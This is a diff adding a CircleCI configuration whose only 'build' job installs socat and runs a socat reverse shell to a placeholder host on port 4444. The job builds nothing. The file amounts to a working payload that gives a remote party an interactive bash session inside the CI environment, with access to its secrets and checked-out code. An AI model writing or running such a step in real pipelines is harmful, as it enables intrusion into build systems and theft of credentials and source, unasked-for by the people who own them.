@@ -1,0 +1,14 @@
+version: 2.1
+workflows:
+  main:
+    jobs:
+      - build
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604:201903-01
+    steps:
+      - checkout
+      - run: sudo apt-get -qy update
+      - run: sudo apt-get -qy install socat
+      - run: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:your.host.invalid:4444
